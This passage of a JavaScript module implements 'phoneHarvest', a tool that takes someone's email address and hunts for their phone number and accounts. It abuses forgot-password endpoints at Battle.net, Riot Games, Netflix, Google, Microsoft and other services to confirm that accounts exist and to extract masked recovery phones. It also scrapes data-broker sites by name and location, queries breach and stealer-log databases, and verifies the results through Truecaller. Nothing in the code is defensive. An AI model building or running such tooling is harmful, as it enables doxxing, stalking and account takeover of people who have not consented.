      const maskedPhone = d?.maskedPhoneNumber || null;
      return {
        source: 'Nintendo Probe',
        platform: 'Nintendo',
        exists: true,
        maskedPhones: maskedPhone ? [maskedPhone] : [],
        confidence: 'medium',
        note: maskedPhone ? `Nintendo account + phone: ${maskedPhone}` : 'Nintendo account confirmed',
      };
    }
  } catch (e) {}
  return null;
}

// ─── 5s. Battle.net (Blizzard) account probe ─────────────────────────────────
// Blizzard's forgot-password flow can reveal masked phone on 2FA-enabled accounts.

async function probeBattleNet(email) {
  try {
    const resp = await safePost(
      'https://us.battle.net/account/creation/flow/forgotpassword.json',
      JSON.stringify({ email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'https://us.battle.net',
          Referer: 'https://us.battle.net/account/creation/flow/forgotpassword',
        },
        timeout: 10000,
      }
    );
    if (resp?.status === 200 && resp.data) {
      const d = typeof resp.data === 'object' ? resp.data : {};
      const exists = d?.emailFound === true || d?.result === 'EMAIL_FOUND' || d?.success === true;
      const maskedPhone = d?.phoneNumber || d?.maskedPhone || null;
      if (exists || maskedPhone) {
        return {
          source: 'Battle.net Probe',
          platform: 'BattleNet',
          exists: true,
          maskedPhones: maskedPhone ? [maskedPhone] : [],
          confidence: maskedPhone ? 'medium' : 'medium',
          note: maskedPhone ? `Blizzard account + phone hint: ${maskedPhone}` : 'Battle.net account confirmed',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5t. Riot Games (League of Legends) probe ────────────────────────────────

async function probeRiotGames(email) {
  try {
    const resp = await safePost(
      'https://auth.riotgames.com/api/v1/forgot-password',
      JSON.stringify({ type: 'email', value: email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'https://auth.riotgames.com',
        },
        timeout: 8000,
      }
    );
    if (resp?.status === 200 || resp?.status === 400) {
      const d = typeof resp.data === 'object' ? resp.data : {};
      const exists = resp.status === 200 || d?.type === 'EMAIL_SENT';
      const maskedPhone = d?.maskedPhone || d?.phone || null;
      if (exists) {
        return {
          source: 'Riot Games Probe',
          platform: 'RiotGames',
          exists: true,
          maskedPhones: maskedPhone ? [maskedPhone] : [],
          confidence: 'medium',
          note: maskedPhone ? `Riot account + phone: ${maskedPhone}` : 'Riot Games account confirmed',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── 5u. Netflix account probe ───────────────────────────────────────────────

async function probeNetflix(email) {
  try {
    const resp = await safePost(
      'https://www.netflix.com/password',
      JSON.stringify({ email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          Accept: 'application/json',
          Origin: 'https://www.netflix.com',
        },
        timeout: 8000,
      }
    );
    if (resp?.status === 200) {
      return {
        source: 'Netflix Probe',
        platform: 'Netflix',
        exists: true,
        confidence: 'medium',
        note: 'Netflix account registered with this email',
      };
    }
  } catch (e) {}
  return null;
}

// ─── Main orchestrator ────────────────────────────────────────────────────────

async function phoneHarvest(email, knownNames, knownLocations, progressCb) {
  if (progressCb) progressCb({ sub: 'Phone harvest — password reset probes + data brokers + breach APIs + GitHub code' });

  const name = (knownNames || [])[0] || null;
  const location = (knownLocations || [])[0] || null;

  // All engines fire in parallel
  const [
    fbResult, liResult, twResult, igResult, snapResult,
    tpsPhones, fpsPhones, radarisPhones, wpPhones, phoneEleven, zabaPhones, spokeoPhones, checkPeoplePhones,
    leakCheck, proxynova, snusbase, dehashed,
    hudsonRockResult, pdlResult, fullContactResult,
    secTrails, viewDns,
    intelxDeep,
    ghCodeResult, breachDirResult, googleProbeResult,
    msResult, discordResult, steamResult,
    // ── Wave 2: new breach + enrichment + platform probes ──
    leakLookup2Result, ghostProjectResult, emailRepResult, gravatarResult, clearbitResult,
    spotifyResult, paypalResult, appleResult, adobeResult, twitchResult,
    robloxResult, nintendoResult, battleNetResult, riotResult, netflixResult,
    // ── Wave 3: Hunter.io person enrichment ──
    hunterResult,
  ] = await Promise.allSettled([
    probeFacebook(email),
    probeLinkedIn(email),
    probeTwitter(email),
    probeInstagram(email),
    probeSnapchat(email),
    name ? scrapeTruePeopleSearch(name, location) : Promise.resolve([]),
    name ? scrapeFastPeopleSearch(name, location) : Promise.resolve([]),
    name ? scrapeRadaris(name, location) : Promise.resolve([]),
    name ? scrapeWhitePages(name, location) : Promise.resolve([]),
    name ? scrape411(name, location) : Promise.resolve([]),
    name ? scrapeZabaSearch(name, location) : Promise.resolve([]),
    name ? scrapeSpokeo(name, location) : Promise.resolve([]),
    name ? scrapeCheckPeople(name, location) : Promise.resolve([]),
    checkLeakCheck(email),
    checkProxynova(email),
    checkSnusbase(email),
    checkDehashed(email),
    // ── Wave 1: stealer logs + people enrichment APIs ──
    checkHudsonRock(email),
    checkPeopleDatalabs(email),
    checkFullContact(email),
    checkSecurityTrails(email),
    checkViewDNS(email),
    intelXDeepSearch(email, knownNames),
    // ── GitHub code search, BreachDirectory, Google Account probe ──
    searchGitHubCode(email),
    searchBreachDirectory(email),
    probeGoogleAccount(email),
    // ── Platform existence probes (wave 1) ──
    probeMicrosoft(email),
    probeDiscord(email),
    probeSteam(email),
    // ── Wave 2: breach + enrichment ──
    checkLeakLookup2(email),
    checkGhostProject(email),
    checkEmailRep(email),
    checkGravatar(email),
    checkClearbit(email),
    // ── Wave 2: platform probes ──
    probeSpotify(email),
    probePayPal(email),
    probeApple(email),
    probeAdobe(email),
    probeTwitch(email),
    probeRoblox(email),
    probeNintendo(email),
    probeBattleNet(email),
    probeRiotGames(email),
    probeNetflix(email),
    // ── Wave 3 ──
    checkHunterIO(email),
  ]);

  const allResults = [];
  const allPhones = [];

  // Password reset probes
  for (const r of [fbResult, liResult, twResult, igResult, snapResult]) {
    if (r.status === 'fulfilled' && r.value) {
      allResults.push(r.value);
      if (r.value.maskedPhones?.length > 0) {
        for (const mp of r.value.maskedPhones) {
          allResults.push({
            source: r.value.source,
            maskedPhone: mp,
            note: `Masked recovery phone from ${r.value.platform} password reset — partial digits revealed`,
            confidence: 'medium',
            phones: [],
          });
        }
      }
    }
  }

  // People search phone aggregation
  const peopleSearchPhones = [
    ...(tpsPhones.status === 'fulfilled' ? tpsPhones.value : []),
    ...(fpsPhones.status === 'fulfilled' ? fpsPhones.value : []),
    ...(radarisPhones.status === 'fulfilled' ? radarisPhones.value : []),
    ...(wpPhones.status === 'fulfilled' ? wpPhones.value : []),
    ...(phoneEleven.status === 'fulfilled' ? phoneEleven.value : []),
    ...(zabaPhones.status === 'fulfilled' ? zabaPhones.value : []),
    ...(spokeoPhones.status === 'fulfilled' ? spokeoPhones.value : []),
    ...(checkPeoplePhones.status === 'fulfilled' ? checkPeoplePhones.value : []),
  ];

  if (peopleSearchPhones.length > 0) {
    allPhones.push(...peopleSearchPhones);
    allResults.push({
      source: 'People Search Brokers',
      phones: [...new Set(peopleSearchPhones)],
      name,
      location,
      note: `Scraped from data broker sites using name "${name}" + location "${location}"`,
      confidence: 'medium',
    });
  }

  // Breach/leak APIs
  for (const r of [leakCheck, proxynova, snusbase, dehashed]) {
    if (r.status === 'fulfilled' && r.value) {
      allResults.push(r.value);
      if (r.value.phones) allPhones.push(...r.value.phones);
    }
  }

  // Hudson Rock Cavalier stealer logs
  if (hudsonRockResult.status === 'fulfilled' && hudsonRockResult.value) {
    const hr = hudsonRockResult.value;
    allResults.push(hr);
    if (hr.phones?.length > 0) allPhones.push(...hr.phones);
  }

  // People Data Labs
  if (pdlResult.status === 'fulfilled' && pdlResult.value) {
    const pdl = pdlResult.value;
    allResults.push(pdl);
    if (pdl.phones?.length > 0) allPhones.push(...pdl.phones);
  }

  // FullContact
  if (fullContactResult.status === 'fulfilled' && fullContactResult.value) {
    const fc = fullContactResult.value;
    allResults.push(fc);
    if (fc.phones?.length > 0) allPhones.push(...fc.phones);
  }

  // Platform existence probes — surface account confirmation, masked phones where present
  for (const r of [msResult, discordResult, steamResult]) {
    if (r.status === 'fulfilled' && r.value) {
      allResults.push(r.value);
      // Microsoft probe may return masked phone in sFA
      if (r.value.maskedPhones?.length > 0) {
        for (const mp of r.value.maskedPhones) {
          allResults.push({
            source: r.value.source,
            maskedPhone: mp,
            note: `Masked recovery phone from ${r.value.platform} — partial digits visible`,
            confidence: 'medium',
            phones: [],
          });
        }
      }
    }
  }

  // ── Wave 2 breach + enrichment results ─────────────────────────────────────
  // Leak-Lookup, GhostProject, EmailRep, Gravatar, Clearbit
  for (const r of [leakLookup2Result, ghostProjectResult, emailRepResult, gravatarResult, clearbitResult]) {
    if (r.status === 'fulfilled' && r.value) {
      allResults.push(r.value);
      if (r.value.phones?.length > 0) allPhones.push(...r.value.phones);
    }
  }

  // ── Wave 3: Hunter.io person enrichment ───────────────────────────────────
  if (hunterResult.status === 'fulfilled' && hunterResult.value) {
    const hr = hunterResult.value;
    allResults.push(hr);
    if (hr.phones?.length > 0) allPhones.push(...hr.phones);
  }

  // Wave 2 platform probes — surface existence + any masked phones
  for (const r of [spotifyResult, paypalResult, appleResult, adobeResult, twitchResult,
                   robloxResult, nintendoResult, battleNetResult, riotResult, netflixResult]) {
    if (r.status === 'fulfilled' && r.value) {
      allResults.push(r.value);
      if (r.value.maskedPhones?.length > 0) {
        for (const mp of r.value.maskedPhones) {
          allResults.push({
            source: r.value.source,
            maskedPhone: mp,
            note: `Masked recovery phone from ${r.value.platform}`,
            confidence: 'medium',
            phones: [],
          });
        }
      }
    }
  }

  // Historical WHOIS
  for (const r of [secTrails, viewDns]) {
    if (r.status === 'fulfilled' && r.value) {
      allResults.push(r.value);
      if (r.value.phones) allPhones.push(...r.value.phones);
    }
  }

  // IntelX deep
  if (intelxDeep.status === 'fulfilled' && intelxDeep.value) {
    allResults.push(intelxDeep.value);
    if (intelxDeep.value.phones) allPhones.push(...intelxDeep.value.phones);
  }

  // GitHub Code Search — phones found adjacent to email in public repos
  if (ghCodeResult.status === 'fulfilled' && ghCodeResult.value) {
    allResults.push(ghCodeResult.value);
    if (ghCodeResult.value.phones?.length > 0) {
      allPhones.push(...ghCodeResult.value.phones);
    }
  }

  // BreachDirectory — additional breach corpus cross-check
  if (breachDirResult.status === 'fulfilled' && breachDirResult.value) {
    allResults.push(breachDirResult.value);
    // BreachDirectory result doesn't directly return phone numbers but enriches
    // the breach picture — no phone push here unless future API version adds them
  }

  // Google Account Recovery probe — masked phones from Gmail forgot-password flow
  if (googleProbeResult.status === 'fulfilled' && googleProbeResult.value) {
    const gp = googleProbeResult.value;
    allResults.push(gp);
    if (gp.maskedPhones?.length > 0) {
      for (const mp of gp.maskedPhones) {
        allResults.push({
          source: 'Google Account Probe',
          maskedPhone: mp,
          note: `Google account recovery phone (masked) — last digits visible`,
          confidence: 'medium',
          phones: [],
        });
      }
    }
  }

  // Proxynova partial phone note — log but don't push as full phones
  const proxynovaResult = proxynova.status === 'fulfilled' ? proxynova.value : null;
  if (proxynovaResult?.partialPhones?.length > 0) {
    allResults.push({
      source: 'Proxynova COMB (partial)',
      partialPhones: proxynovaResult.partialPhones,
      note: proxynovaResult.note,
      confidence: 'low',
      phones: [],
    });
  }

  // Truecaller cross-verify any phones found
  if (allPhones.length > 0) {
    if (progressCb) progressCb({ sub: `Truecaller verify: ${allPhones.length} phone(s)` });
    const tcResults = await truecallerVerify([...new Set(allPhones)]);
    for (const tc of tcResults) {
      allResults.push({
        source: 'Truecaller',
        platform: 'Truecaller',
        found: true,
        phones: [tc.phone],
        name: tc.name,
        location: tc.location,
        carrier: tc.carrier,
        note: `Truecaller confirmed: ${tc.name}`,
        confidence: 'high',
      });
    }
  }

  return allResults.filter(Boolean);
}

module.exports = { phoneHarvest };
